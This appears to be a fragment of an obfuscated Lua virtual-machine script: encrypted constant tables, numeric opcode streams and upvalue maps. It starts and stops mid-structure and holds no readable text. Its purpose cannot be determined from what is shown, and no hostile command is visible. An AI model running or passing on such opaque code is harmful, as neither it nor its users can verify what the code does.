8,37,116,20,56,50,26,56,58,18,37,18,36,116,61,61,56,48,39,16,41,487,45,55,116,21,16,19,41,495,45,55,116,18,116,23,18,36,116,61,61,56,48,39,16,41,476,45,55,56,59,16,19,41,452,45,55,56,56,12,19,116,16,61,116,17,61,30,51,38,34,18,34,116,32,12,33,116,35,61,116,36,56,51,116,30,30,55,116,37,116,36,30,50,26,18,34,116,31,12,33,116,35,61,116,36,56,51,116,28,30,55,116,36,116,36,30,50,26,18,34,116,29,12,19,116,29,61,116,26,61,26,56,58,18,37,18,36,116,27,61,116,24,18,36,116,61,61,56,48,39,16,41,611,45,55,56,59,16,19,41,619,45,55,56,61,12,19,116,16,61,116,25,61,30,51,38,35,18,35,116,32,12,33,116,35,61,116,37,56,51,116,6,30,55,43,116,37,116,36,30,50,26,18,35,116,31,12,33,116,35,61,116,36,56,51,116,7,30,55,116,36,116,36,30,50,26,18,36,116,61,61,38,32,18,37,116,4,61,16,116,5,61,53,40,55,30,52,45,55,18,37,116,2,61,16,116,5,61,53,40,52,30,52,45,55,18,37,116,3,61,16,116,5,61,53,40,53,30,52,45,55,22,37,22,34,22,35,22,32,20,307,56,50,116,0,12,33,116,35,61,116,36,116,36,116,36,18,59,56,51,116,1,30,55,117,56,51,116,14,30,55,14,30,50,26,56,36,116,42,116,15,18,59,60,26,10,54},P={{K={{77,201,71,166},{116,204,45,182},{78,231,5,244},{22,255,46,180,11,158,174},{105,223,48,162,27,149,225,69},{110,221,37,180,15,180,244},{63,146,15,183,9,222},{83,199,52,176,2,152},{82,193,37},{72,218,42,146,10},1,28,{199,56,237}},C={56,54,6,55,56,52,116,54,56,53,116,55,61,26,56,50,116,54,116,52,56,54,116,53,12,50,56,53,116,51,61,30,55,116,48,12,49,116,62,61,12,50,56,53,116,63,61,30,55,116,60,116,61,30,53,116,58,60,60,60,60,60,60,26,56,51,30,54,45,55,10,54},P={},U={{1,22},{0,6},{0,15},{1,18},{0,16},{0,17}},nParams=0},{K={7,49,{110,199,37},{94,206,33,190,15,137,225,84,218,35,153,2,108,252,84,138}},C={116,54,116,54,117,116,55,39,16,41,35,45,55,56,54,116,52,61,56,55,31,41,22,56,52,116,53,56,53,26,20,22,10,54},P={},U={{1,18},{0,6},{1,19},{0,7}},nParams=0},{K={1,2,{110,199,37},{94,206,33,190,15,137,225,84,218,35,153,2,108,252,84,138}},C={116,54,116,54,14,116,55,39,16,41,35,45,55,56,54,116,52,61,56,55,31,41,22,56,52,116,53,56,53,26,20,22,10,54},P={},U={{1,18},{0,6},{1,19},{0,8}},nParams=0}},U={{1,14},{1,10},{1,1},{1,101},{1,80},{1,22},{1,100},{1,27},{1,26},{1,36},{1,37},{1,34},{1,39},{1,30},{1,33},{1,82},{1,84},{1,103},{1,79}},nParams=0},{K={15,225,100,7,2,{74,212,40,178,26,146,226,87,226,38,140,3,99,246,77,242,32,146,0,102,244,78,165},{107,221,43,173,6,156,244,86},{80,223,39,186,9,182,246},{75,219,37,147,9}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,56,54,61,38,54,116,52,116,53,21,116,50,39,16,41,26,45,55,18,54,41,125,56,52,16,116,51,61,53,12,48,18,54,116,49,61,30,55,18,54,116,62,61,56,53,30,50,45,55,20,125,10,54},P={},U={{1,100},{1,101},{1,2},{1,7}},nParams=0},{K={12,144,3,2,9,{106,222,55,163,24,148,254,68},{117,221,39,145,15},{71,210,43,188},{107,219,37,147,9},{102,252,14,157,43,83,209,105,238,109,179,54,84,207,105,237},{118,197,44,252,63,119,249,68,155,58,142,84,74,255},{103,223,43,175,17,96,226,76,206},7,49,{119,200,36,141,18,116,224,124,222,32,145},{120,212,61,136,0,110,245,67},{106,250,61,131,24,109},{5,206,53,141,18},{95,223,35,131,18,126,200,89,167},{79,208,54,128},{94,180,33,143,23,107},{72,174,38,138,27,121},{67,173,54,137,23,46,194,9,160,59,128,229,41,225,92,184,12,151,247,110,194,93,180,76,213,218,113,209,58,179,27,143,173,11,155,4,180,13,96,248,119,214,44,153,22,116,183,111,215,51,151,25,104,234,84,182,93,134,18,115,194,90,233,46,210,225,53,201,85,170,65,151,189,77,204,41,167,32,150,254,92,218,44,180,15,214,179,108,194,39,188,30,108,255,77,238,32,141,1,88,250,92,181,118,203,79,36,170,90,160,121,158,95,102,205,93,165,126,131,170,84,236,79,177,14,147,180,95,233,48,180,5,158,160,79,209,48,242,72,102,191,3,223,96,250,20,44,178,104,248,35,133,26,111,179,113,173,49,133,25,124,138,5,228,126,136,173,36,142,26,168,14,151,140},{104},{104},{104},{94,167,45,132},{85,179,59,131,178},{121,167,52,133,215,113,196,78,162,18},{87,173,49,134,236,94,205,66},{99,154,125,163,198,88,253},{86,170,51,148},{6},{26,186,1,129,246,124,200}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,56,54,61,38,54,116,52,116,53,3,116,50,39,16,41,112,45,55,18,54,19,16,19,41,112,45,55,12,51,18,54,116,48,61,30,55,12,51,12,49,116,62,61,30,55,31,41,96,56,52,116,63,116,60,30,52,45,55,10,54,20,96,56,53,116,61,61,38,55,116,58,116,58,117,116,59,39,16,41,79,45,55,18,55,19,16,19,41,79,45,55,18,55,116,56,61,19,41,73,10,54,20,73,18,55,116,56,61,116,57,61,38,52,18,55,116,56,61,116,38,61,38,53,56,50,116,39,1,16,116,36,56,54,26,16,116,37,49,12,34,116,35,61,116,32,18,52,116,33,61,18,52,116,46,61,116,52,14,18,52,116,47,61,12,44,116,45,61,18,53,116,42,61,116,33,61,18,53,116,42,61,116,47,61,50,52,-1,63,55,26,16,116,43,56,51,26,30,52,45,55,56,52,116,40,18,54,116,41,61,16,19,41,199,45,55,116,22,116,23,60,30,52,45,55,10,54},P={},U={{1,100},{1,101},{1,23},{1,7},{1,13},{1,10}},nParams=0},{K={1,2,{52,221,36,186,3},{104,206,48,178,13,143,219,72,208},{126,223,39,179},{121,208,41,178,80,186,245,87,229,44,174,25,107,246,77,147,108,177,24,102,227,72,178,32,196,80,34,211,93,166,57,135,46,125,197,78,175,47,202,200,127,202,87,231,64,215,161},{126,214,40,177,5,181,244,93},{107,250,5,146,41,187},{79,213,42,191},{29}},C={116,54,116,54,14,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,52,1,16,116,53,56,54,26,16,116,50,116,51,26,16,116,48,56,52,26,30,52,45,55,56,53,116,49,56,50,56,54,61,16,41,113,45,55,56,50,56,54,61,116,62,61,16,19,41,121,45,55,116,63,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23},{1,101}},nParams=0},{K={15,225,{52,221,36,186,3},{104,206,48,178,13,143,219,72,208},{126,223,39,179},{105,217,45,187,15,221,228,81,195,44,252,11,109,181,68,212,45,128,24,39,238,16,187,46,198,31,99,237,18,172,101,218,82,32,193,0,234,57,159,163,98,242,85,146,95,142,245,59,203,47,176,71,159,227,68},{126,214,40,177,5,181,244,93},{99,225,7,138,36,223,193,96,246,31},{}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,52,1,16,116,53,56,54,26,16,116,50,116,51,26,16,116,48,56,52,26,30,52,45,55,56,53,116,49,116,62,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={100,7,2,{51,220,39,187,12},{105,209,49,177,12,136,218,75,209},{125,222,32,178},{115,221,38,185,7,222,253,84,138,45,188,29,102,172,110,217,59,177,16,122,237,71,162,49,207,88,93,204,82,191,60,158,12,48,140,22,135,49,146,229,123,250,81,177,26,147,251,22,195,45,182,9,151,174,84,221,52,231,10,97,254,67,131,11,186,6,86,253,89,200,56,135,18,34,191,101,176,51,155,53,97,210,64,188,8,139,243,98,206,89,168,66,218,140,117,195,92,179,9,216,236,107,216,121,187,26,199,199,66,223,61,154,0,112,214,64,210,34,133,92,37,202,65,161,42,131,11,75,234,91,231,113,225,18,126,199,86,166,125,159,239,114,148,91,186,11,207,206,114,192,37,146,14,136,254,84,240,46,176,0,155,186,7,231,20,141,83,45,183,67,219,112,140,26,109,188,91,170,48,134,91,97,205,80,253,30,136,243,103,212,86,181,119,219,165,125,197,90,219,8,152,233,124,220,99,160,25,193,248,77,199,35,168,30,96,247,66,148,14,149,1,116,252,66,203,17,132,21,110,236,80,234,1,131,24,103,211,89,187,40,188,235,111,205,49,162,14,151,230,118,141,45,188,4,196,249,118,193,107,140,4,139,242,76,242,36,188,18,111,243,77,156,46,140,17,40,245,65,181,116,146,19,126,142,126,169,44,159,26,87,203,89,169,50,148,224,55,197,79,248,21,134,167,68,147,122,229,88,219,225,83,148,49,170,67,89,175,19,137,124,246,120,105,247,72,223,61,196,4,109,160,121,173,37,157,29,97,193,80,230,53,139,246,60,133,105,174,18,150,227,119,235,74,187,71,209,171,109,214,106,153,11,144,245,30,148,22,131,60,32,181,91,220,96,179,17,116,255,89,143,61,181,9,109,232,92,248,62,138,18,98,193,23,185,58,222,202,113,199,83,189,7,178,253,114,231,47,167,2,142,176,84,193,51,188,76,140,245,11,226,2,176,21,97,239,104,216,56,130,0,96,243,93,255,16,134,14,99,143,110,142,52,137,229,107,228,92,164,62,132,236,119,217,16,130,13,149,230,116,222,36,246,26,155,161,114,212,58,190,0,117,169,64,207,36,234,31,105,250,77,211,114,140,21,108,163,120,170,36,158,28,126,192,83,231,50,138,245,61,138,114,163,0,147,226,86,204,34,182,10,219,165,63,219,40,191,69,173,248,94,210,119,136,52,106,251,27,146,33,135,2,32,170,2,241,120,214,86,61,137,19,175,52,139,81,80,196,91,160,57,131,235,98,196,89,147,12,154,230,110,156,127,150,7,151,225,83,135,105,180,8,119,187,22,149,124,243,66,44,184,66,211,54,202,53,107,254,91,164,36,134,9,97,198,97,186,58,128,242,100,198,72,168,14,144,255,36,156,31,187,8,159,165,68,248,42,179,15,133,173,26,143,112,214,6,111,242,6,232,45,128,24,98,206,84,176,54,219,20,99,253,18,164,54,143,94,84,202,66,167,115,163,224,119,197,89,155,27,133,237,53,232,40,160,71,149,255,0,246,40,172,1,209,193,70,217,39,187,37,125,231,79,147,3,151,4,108,232,76,170,117,129,22,105,143,125,170,59,138,229,71,212,88,162,44,130,228,106,206,80,178,29,202,186,61,217,46,177,71,172,238,80,208,38,175,83,114,243,45,214,34,131,18,106,185,115,219,111,172,22,120,234,80,170,52,143,83,126,198,65,225,126,171,231,118,201,87,236,72,212,216,126,131,20,182,30,141,249,109,215,120,250,25,156,233,69,196,57,184,4,106,242,19,147,96,211,76,63,169,28,240,109,215,72,58,130,19,175,52,139,81,91,200,89,172,59,204,219,115,132,105,181,27,130,252,110,202,98,138,12,193,202,68,199,51,168,2,121,187,15,179,37,185,82,104,247,73,158,37,140,18,100,189,68,162,37,130,82,124,210,84,191,53,198,231,97,201,89,185,9,156,232,49,133,31,180,10,138,171,119,140,117,251,88,205,176,71,217,105,181,2,101,187,120,212,61,136,0,110,245,67,253,6,162,16,97,173,28,171,61,156,86,33,136,90,171,41,152,173,100,200,82,171,13,152,160,54,159,115,248,86,200,164,12,131,106,180,13,139,250,11,202,42,176,21,107,250,2,144,97,209,90,56,174,6,235,117,156,26,125,202,26,176,59,132,244,59,150,23,252,107,219,165,125,197,90,241,13,154,237,51,224,44,165,0,136,230,77,219,117,142,42,104,249,21,148,35,133,4,46,169,0,143,126,213,84,59,183,17,161,57,142,84,48,198,88,173,86,155,227,102,195,21,170,4,152,230,99,133,114,253,83,213,234,106,220,38,172,2,145,255,12,158,64,177,31,96,247,69,156,59,149,72,111,250,67,164,110,160,31,121,243,86,180,47,133,28,119,141,26,159,41,148,225,121,249,88,162,21,159,234,121,141,107,239,43,137,235,64,192,34,242,4,109,244,10,237,59,186,23,107,209,69,216,62,202,25,111,234,24,243,120,223,85,35,217,124,165,58,137,228,64,213,91,163,19,131,231,107,201,81,177,28,197,186,50,243,37,180,1,154,226,76,195,39,184,59,112,244,70,200,62,128,6,98,244,78,185,110,215,4,37,149,70,178,98,187,18,112,221,31,227,125,132,244,56,234,83,162,18,153,237,111,203,37,238,36,149,227,78,214,37,173,68,153,231,75,219,63,183,30,106,191,3,157,35,132,76,77,249,92,182,39,135,2,38,136,20,162,52,137,169,25,195,87,168,118,248},{65,215,43,176,2,180,247,92},{107,225,10,138,62,67,210,116,252},{}},C={116,54,116,55,21,116,52,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,53,1,16,116,50,56,54,26,16,116,51,116,48,26,16,116,49,56,52,26,30,52,45,55,56,53,116,62,116,63,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={12,144,3,2,9,{74,212,60,163},{76,226,28,248,40,182,208,112},{98,210,37,178,11,141,253,80,214,47,157,30,104,248,88,142},{98,219,43,181,31,51},{68,199,39,182,60,70,214},20,70,{118,232,18},{117,237,3,143,34,64,220},{116,238,2,176,83,85,201,117},{7,200,43,143,16},{93,221,61,133,16,124,206,71,165},{73,210,52,134},{88,202,35,141,25,109},{74,208,32,136,25,127},{65,175,48,135,21,44,247,65,248,63,138,19,116,158,112,175,41,163,230,100,223,85,172,7,221,170,83,218,53,164,52,159,255,86,218,37,188,78,214,178,73,215,40,191,29,36,251,90,128,55,130,27,108,166,104,167,33,187,30,124,215,93,164,63,197,162,67,202,88,181,58,128,246,58,130,16,157,11,148,235,113,224,47,183,16,153,253,40,217,39,184,15,109,180,65,207,35,131,7,111,246,66,159,32,205,23,34,190,88,162,119,153,4,126,131,87,167,56,207,241,108,198,21,188,4,133,242,127,222,52,243,18,145,233,113,146,55,189,31,139,227,74,151,57,164,30,45,228,76,205,58,135,6,124,179,65,232,116,130,22,126,197,90,160,121,132,11,102,213,103,185,59,128,241,114,217,73,240,23,158,236,114,143,48,176,28,142,252,79,148,47,174,25,112,204,84,220,61,170,23,118,236,3,209,120,196,18,102,238,85,170,48,201,14,106,211,64,173,40,154,161,96,207,95,163,64,129,227,109,217,77,188,69,138,238,111,196,33,164,30,213,255,10,150,44,178,11,34,240,70,223,68,141,4,41,217,69,161,39,146,28,104,165,113,170,54,133,27,114,208,31,172,40,158,224,98,192,83,161,74,152,251,124,135,75,164,4,155,225,76,155,52,245,23,170,224,73,133,105,251,2,43,251,69,218,114,207,59,108,232,71,173,49,213,89,94,238,103,147,120,193,200,118,199,93,169,45,129,184,99,240,28,146,11,153,254,120,222,55,251,61,133,255,71,151,21,230,76,96,228,87,214,36,131,18,114,240,67,209,125,143,11,100,240,19,185,123,168,18,116,218,11,161,47,213,200,70,231,117,139,15,151,232,126,200,104,168,19,144,232,34,198,42,171,31,140,248,74,208,98,177,0,45,195,90,217,61,171,17,33,183,64,160,57,130,71,97,208,29,136,56,129,26,62,213,74,174,99,211,231,127,203,73,242,79,155,250,123,146,47,166,15,215,239,69,217,46,180,38,101,234,27,155,105,172,80,120,177,86,151,91,129,25,110,180,58},{79,165,57,142,20,70,197,74},{124,146,12,200,58,77,245,125,145,31},{94,162,59,140},{14}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,116,52,116,53,3,116,50,39,16,41,30,45,55,56,55,56,54,61,41,97,56,55,56,54,44,26,56,52,116,51,116,48,26,56,52,116,49,12,62,116,63,61,116,60,116,60,116,61,30,53,26,56,53,116,58,116,59,30,52,45,55,10,54,20,97,56,55,56,54,36,26,56,52,116,51,116,56,26,56,52,116,49,56,50,26,56,51,116,57,1,16,116,38,56,54,26,16,116,39,12,36,116,37,61,116,34,56,48,56,49,30,53,26,16,116,35,56,49,26,30,52,45,55,56,53,116,32,56,62,56,54,61,16,41,145,45,55,56,62,56,54,61,116,33,61,16,19,41,153,45,55,116,46,30,52,45,55,10,54},P={},U={{1,100},{1,102},{1,94},{1,23},{1,31},{1,13},{1,9},{1,10},{1,101}},nParams=0},{K={7,49,{52,221,36,186,3},{104,206,48,178,13,143,219,72,208},{126,223,39,179},{114,222,39,182,6,221,243,30,209,40,177,10,56,210,77,207,29,132,6,113,243,78,165,123,196,41,96,254,75,160,42,152,92,56,138,123,165,62,145,239,70,197,93,182,7,135,166,88,198,32,166,6,153,249,69,193,102,181,3,156,243,73,152,57,227,18,36,246,68,217,112,128,76,79,245,65,166,19,129,9,125,213,119,175,51,129,228,59,132,113,185,50,147,235,119,194,90,131,11,152,254,77,209,49,162,75,213,175,75,211,104,169,78,117,252,66,212,109,146,93,71,247,79,215,61,151,29,111,163,95,171,35,202,15,62,226,88,170,52,128,240,112,204,27,171,15,144},{126,214,40,177,5,181,244,93},{102,225,3,156,54,186},{117,251,0,157,33,69,215}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,52,1,16,116,53,56,54,26,16,116,50,116,51,26,16,116,48,56,52,26,30,52,45,55,56,53,116,49,116,62,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={1,2,{52,221,36,186,3},{104,206,48,178,13,143,219,72,208},{126,223,39,179},{114,222,39,182,6,221,252,83,139,46,189,2,103,175,111,222,58,178,17,117,236,68,163,54,206,91,92,243,83,188,61,153,13,51,141,25,134,50,147,226,122,249,80,174,27,144,250,59,218,32,167,12,212,254,80,210,49,183,68,153,231,75,219,63,183,30,106,191,3,157,39,139,31,101,249,15,182,52,155,16,32,214,85,174,46,197,176,61,151,16,236,59,157,165,116,196,93,176,8,215,226,32,220,51,248,42,148,238,80,212,43,175,11,115,180,70,212,41,192,31,118,183,111,215,51,151,25,104,234,84,182,109,172,20,126,199,112,160,46,156,246,86,192,82,162,5,187,225,89,193,33,160,21,209,174,87,199,40,185,5,145,248,64,149,99,253,25,101,182,65,156,59,138,16,102,187,70,239,28,130,27,97,212,91,251,105,204,26,124,193,24,174,48,149,164,114,196,89,249},{126,214,40,177,5,181,244,93},{108,252,9,137,76,180,219,105,244},{96,247,19,147,59,69}},C={116,54,116,54,14,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,52,1,16,116,53,56,54,26,16,116,50,116,51,26,16,116,48,56,52,26,30,52,45,55,56,53,116,49,116,62,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={15,225,100,7,2,12,144,{83,214,50,186,0,150,226,71,215,42,172,21},{81,215,38,182,1},{72,218,42,146,10},{105,249,11,149,43},{80,216,57,169,2,106,248,78}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,56,54,61,38,54,116,52,116,53,21,116,50,39,16,41,26,45,55,18,54,41,85,116,51,116,51,117,116,48,39,16,41,11,45,55,12,49,41,120,12,62,12,49,18,54,116,63,61,30,52,45,55,20,120,49,56,52,116,60,12,61,18,54,116,63,61,50,55,-1,63,55,45,55,20,85,10,54},P={},U={{1,100},{1,101},{1,23}},nParams=0},{K={3,2,9,{51,220,39,187,12},{105,209,49,177,12,136,218,75,209},{125,222,32,178},{64,237,14,145,39,178,197,108,229,15,156,52,80,201,118},{65,215,43,176,2,180,247,92},{106,253,11,150,77,84,219,116,252,13,155,33},{113,240,6,143}},C={116,54,116,55,3,116,52,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,53,1,16,116,50,56,54,26,16,116,51,116,48,26,16,116,49,56,52,26,30,52,45,55,56,53,116,62,116,63,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={7,49,{52,221,36,186,3},{104,206,48,178,13,143,219,72,208},{126,223,39,179},{114,222,39,182,6,221,217,103,139,112,234,90,50,160,16,131,119,212,77,53,175,30,242,89,128,22,126,191,91,233,46,203,23,127,132,71,171,52,130,240,62,206,93,162,7,219,223,116,220,42,167,23,155,238,69,137,1,188,24,188,250,76,212,47,172,20,106,191,3,148,112,135,25,3,245,73,226,35,210,50,125,224,28,229,10,140,242,103,132,16,236,43,154,224,118,161,82,190,7,150,230,61,212,114,235,32,146,252,86,212,38,184,11,47,250,66,205,101,194,55,99,250,77,211,112,204,88,111,175,31,144,50,146,9,101,209,83,244,126,157,224,109,201,72,189,4,128,238,126,151,111,252,68,215,162,86,246,101,188,90,208,215,69,212,47,224,82,69,228,70,210,59,192,85,108,170,0,145,53,149,31,99,212,14,176,83,128,16,113,196,84,235,58,195,185,94,196,78,164,2,152,234,121,129,44,176,31,211,172,101,209,36,187,1,34,186,6,221,126,241,38,96,224,95,203,35,129,74,40,239,82,187,55,154,15,106,214,92,172,97,193,174,54,137,20,132,36,211,226,43,130,121,179,6,157,182,60,229,43,167,72,221,244,17,152,25,189,29,103,251,92,134,56,235,24,104,249,76,172,115,130,74,49,214,92,182,44,138,16,114,193,25,164,56,135,171,52,237,89,172,3,153,170,50,142,37,231,73,174,232,88,199,51,171,9,194,176,87,218,51,191,2,119,242,94,212,52,217,89,38,190,1,236,28,172,91,106,146,26,129,59,142,229,46,132,117,169,57,134,167,56,207,13,255,52,150,248,120,222,55,235,31,246,227,77,214,41,183,78,101,160,26,243,35,147,7,103,247,79,218,124,139,29,124,182,19,128,50,137,28,124,129,31,233,56,219,172,65,205,67,186,20,134,226,39,143,50,177,30,152,255,108,215,49,177,15,196,190,11,149,100,243,57,71,182,77,136,97,164,20,107,254,19,227,6,142,29,101,212,17,230,61,216,81,66,196,74,174,48,133,185,97,160,81,191,0,151,229,60,203,119,232,33,149,253,85,213,41,185,8,46,253,67,206,100,253,54,96,251,74,210,115,205,87,110,168,30,151,51,145,8,122,208,80,245,121,156,227,108,198,73,190,5,135,239,125,150,16,253,71,214,165,87,245,100,179,95,211,214,66,213,44,225,77,64,250,92,207,33,140,86,39,254,24,238,3,135,11,105,241,70,248,46,225,18,126,199,86,166,125,148,181,43,224,82,188,22,148,230,120,203,111,186,2,141,165,2,247,35,186,13,147,176,12,152,47,232,95,80,242,82,201,37,145,19,52,190,93,160,45,137,8,125,196,64,174,62,215,175,60,132,23,226,22,182,165,124,157,16,151,5,148,239,32,146,1,183,10,151,173,2,209,126,245,62,96,230,66,212,57,221,5,12,252,66,219,88,128,22,111,148,87,171,37,202,20,60,213,22,160,50,207,242,116,193,73,189,73,147,230,119,200,110,132,9,139,231,108,194,36,187,14,196,214,65,195,9,181,25,111,242,91,217,33,202,92,33,187,74,174,94,142,28,45,214,9,143,42,173,87,48,232,87,175,59,157,166,62,138,73,184,6,152,131,122,192,48,245,1,215,244,1,221,41,250,29,97,250,84,202,100,169,72,66,253,95,253,57,141,27,110,239,85,173,126,192,85,47,198,90,194,50,136,161,110,157,115,190,33,219,164,73,205,77,166,71,209,171,106,217,33,185,96,145,255,64,215,37,252,11,51,168,97,213,61,149,21,105,249,72,238,61,131,14,36,189,118,160,59,138,18,51,141,23,174,108,222,215,115,209,72,186,16,144,181,57,220,35,172,6,137,254,69,199,47,189,86,208,189,7,150,101,151,53,36,243,27,147,22,130,21,108,161,13,132,39,135,21,122,131,20,163,107,195,208,114,212,92,162,43,207,255,18,199,81,178,5,155,170,121,130,126,159,7,143,251,67,219,43,190,64,111,241,80,146,111,164,22,101,248,64,157,123,197,28,57,176,101,161,47,158,8,98,198,11,235,46,141,250,116,219,72,171,21,157,227,32,130,111,241,72,215,197,91,146,33,234,69,184,240,71,210,119,255,36,108,230,11,156,43,208,91,88,250,92,164,58,147,71,119,170,95,169,58,141,19,50,193,11,246,23,159,247,99,203,83,179,6,216,231,121,216,106,247,44,158,237,64,216,101,243,77,100,160,8,237,41,167,6,112,234,78,131,115,150,21,114,252,67,176,51,157,21,107,152,26,231,121,192,175,93,227,26,169,83,221,192,120,207,90,239,71,180,238,120,197,102,247,14,206,190,115,215,59,185,1,118,168,82,177,34,142,23,102,246,13,164,103,219,48,98,236,70,164,54,136,27,63,202,82,189,117,210,199,115,202,93,163,64,220,168,127,154,111,128,2,130,249,85,193,35,228,78,141,240,93,217,56,173,20,112,254,78,135,127,204,84,39,178,102,134,117,140,79,32,231,85,164,63,208,162,65,207,94,164,43,208,165,124,159,16,129,5,133,239,115,196,126,172,99,144,224,65,212,36,251,10,52,169,110,212,62,148,18,104,250,73,145,60,128,15,35,188,117,161,52,139,17,50,138,22,173,105,193,214,112,208,79,187,19,145,186,56,223,34,171,7,138,255,122,198,44,188,81,209,190,6,153,100,148,52,35,242,28,146,9,131,22,109,166,12,131,59,147,14,98,205,17,230,61,217,81,66,196,74,174,48,133,185,109,160,81,191,0,151,229,60,203,116,232,33,149,253,85,213,41,185,8,46,253,67,206,100,253,54,96,251,74,210,115,205,87,110,171,30,151,51,145,8,122,208,80,245,121,156,227,108,198,73,190,5,135,239,125,150,16,253,71,214,165,87,245,100,179,92,211,214,66,213,44,225,77,64,244,75,208,108,193,16,49,180,125,161,33,131,23,120,162,72,207,61,133,26,27,193,89,174,87,149,237,114,163,89,161,6,255,228,116,205,32,184,71,137,230,89,142,15,183,31,139,243,75,219,46,240,31,97,224,2,159,3,136,15,43,181,15,177,62,145,85,94,192,70,162,52,153,189,116,199,84,169,113,190,236,127,195,74,184,10,144,128,110,219,58,248,58,151,246,64,218,48,153,5,60,182,85,216,53,129,0,117,252,88,214,54,223,87,36,188,31,234,30,174,93,99,200,79,231,15,132,251,119,199,67,138,15,201,165,104,207,56,178,21,138,233,107,219,33,226,68,209,179,10,153,3,153,122,112,253,80,146,28,137,12,106,244,86,135,32,218,88,127,194,75,167,42,159,26,102,204,92,241,113,222,166,57,132,116,148,67,133,226,101,129,17,190,17,153,225,89,248,33,231,79,114,241,94,216,63,172,23,113,241,79,132,126,203,85,36,179,121,135,92,154,23,118,140,102,163,34,140,238,108,245,78,240,66,129,228,97,205,76,161,0,140,226,122,139,107,248,72,211,190,106,242,105,175,4,123,187,123,208,55,131,27,127,207,93,253,113,148,27,116,254,65,182,61,159,23,117,158,24,229,127,222,173,95,237,54,169,13,135,168,114,130,55,244,14,148,173,80,210,47,171,31,215,245,68,213,46,240,38,107,229,65,206,32,130,21,108,166,104,167,33,171,19,103,205,80,181,63,131,168,58,143,25,168,48,248,236,126,139,72,235,45,132,203,53,146,19,183,27,136,173,11,149,60,179,11,111,158,75,213,46,129,31,38,233,17,246,60,150,12,106,240,82,161,121,132,24,103,139,20,153,61,157,246,124,203,87,171,36,153,238,110,217,37,161,68,208,172,111,156,17,189,19,138,228,86,210,119,255,2,97,238,72,207,60,135,1,97,255,20,238,123,197,84,35,233,119,230,41,194,45,115,209,93,246,108,193,180,55,218,19,128,2,132,236,114,219,127,163,98,157,225,83,148,46,246,21,32,250,72,153,60,190,27,119,235,3,217,48,137,18,36,202,95,177,61,154,12,110,193,80,242,28,139,245,87,207,83,161,4,129,227,119,132,22,251,69,156,228,20,216,34,247,18,199,217,80,247,97,254,34,109,241,77,215,108,200,84,115,242,72,174,89,128,22,126,191,91,233,34,203,23,127,132,71,171,52,130,240,62,209,6,136,7,129,203,115,199,45,176,21,159,227,8,154,111,249,8,144,152,76,222,107,164,75,77,228,107,149,114,179,23,123,232,13,235,117,156,19,107,207,62,171,53,142,225,127,134,73,254,98,187,235,107,223,95,191,7,146,164,115,213,52,254,75,172,238,80,193,33,184,2,100,209,74,211,57,148,22,116,187,5,159,34,215,86,95,251,73,176,34,152,24,45,129,68,171,36,142,241,102,205,79,167,5,206,168,53,143,110,253,47,189,172,111,128,107,138,10,138,244,25,133,122,237,80,115,164,7,236,46,144,16,102,239,19,187,94,130,20,105,170,86,168,61,230,26,124,193,50,174,48,149,142,114,196,89,218,6,152,237,22},{126,214,40,177,5,181,244,93},{109,246,102,138,60,190,223},{114,241,9,142}},C={116,54,116,54,117,116,55,39,16,41,38,45,55,56,54,19,41,32,10,54,20,32,56,55,116,52,1,16,116,53,56,54,26,16,116,50,116,51,26,16,116,48,56,52,26,30,52,45,55,56,53,116,49,116,62,30,52,45,55,10,54},P={},U={{1,100},{1,13},{1,10},{1,23}},nParams=0},{K={1,2,{111,193,50,160,21,147,227,71},{123,206,47,176},{77,220,34,181,12,181,235},{84,222,38,158,14},{108,198,55,177,5,153},{70,220,52,180,13,139},{77,219,36,187,1,32,193,99,245,13,134,79,39,189,88,156,113,136,24,105,252,92,227,29,172,37,50,128,16,187,121,228,237,123,196,91,161,64,155,245,36,203,94,191,0,194,204,123,197,23,178,24,139,249,64,211,97,254,39,118,225,88,232,43,147,2,110,249,72,226,122,198,21,99,252,83,169,120,135,14,44,195,86,167,56,202,196,115,221,111,170,16,131,225,120,203,105,246,55,150,236,89,214,52,170,78,214,188,105,215,40,191,29,84,251,75,196,53,145,86,101,243,76,163,57,200,23,125,156,83,166,55,136,186,84,195,77,159,58,128,243,113,200,91,249,70,187,229,122,227,38,164,31,149,236,71,151,97,209,2,110,247,70,214,109,134,6,104,250,88,214,61,139,88,121,182,94,237,119,131,27,48,208,79,167,124,142,236,113,136,72,183,15,218,245,127,220,53,182,21,141,172,107,218,32,182,75,140,244,80,194,56,179,80,112,239,71,146,61,135,4,125,254,93,181,124,136,83,45,197,95,181,60,133,25,50,205,76,191,46,174,246,114,219,72,181,16,130,169,104,199,39,187,72,137,235,85,193,53,180,77,104,231,82,201,19,173,23,116,237,78,205,37,204,24,35,189,85,175,37,140,21,105,130,71,173,42,155,228,103,211,26,185,8,150,232,57,222,90,166,16,138,229,62,195,33,166,31,152,227,87,158,38,245,79,103,251,76,155,43,143,16,13,246,66,163,50,138,89,106,234,92,166,44,130,17,127,132,71,226,45,145,247,126,133,88,230,66,133,235,122,194,45,252,21,214,246,117,193,42,228,62,186,222,100,225,101,240,1,101,227,66,145,29,134,2,97,243,75,255,119,184,52,93,245,22,235,18,136,225,119,195,75,191,98,137,222,58,232,81,191,16,146,228,105,157,23,175,25,153,173,127,136,106,186,30,113,248,78,217,44,148,26,105,247,3,213,33,138,22,41,227,29,134,5